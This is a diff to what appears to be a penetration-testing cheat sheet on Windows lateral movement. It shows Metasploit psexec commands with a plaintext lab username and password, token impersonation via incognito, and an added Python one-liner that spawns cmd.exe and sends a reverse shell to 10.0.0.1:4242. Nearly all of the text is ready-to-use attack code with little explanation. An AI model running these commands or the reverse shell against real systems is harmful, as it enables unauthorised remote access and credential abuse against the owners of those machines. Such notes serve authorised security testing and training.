@@ -29,3 +29,9 @@ wmiexec is less noisy than psexec
 ### Metasploit 
 
 `# psexec msf5 > use exploit/windows/smb/psexec msf5 exploit(windows/smb/psexec) > set RHOSTS 10.69.88.100 msf5 exploit(windows/smb/psexec) > set SMBDomain GALACTIC.LAN msf5 exploit(windows/smb/psexec) > set SMBUSER d.traya msf5 exploit(windows/smb/psexec) > set SMBPASS triumvirat msf5 exploit(windows/smb/psexec) > run  # Impersonate user use incognito list_tokens -u impersonate_token <token> shell whoami`
+
+#### Python Windows specific
+
+```python
+python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
+```
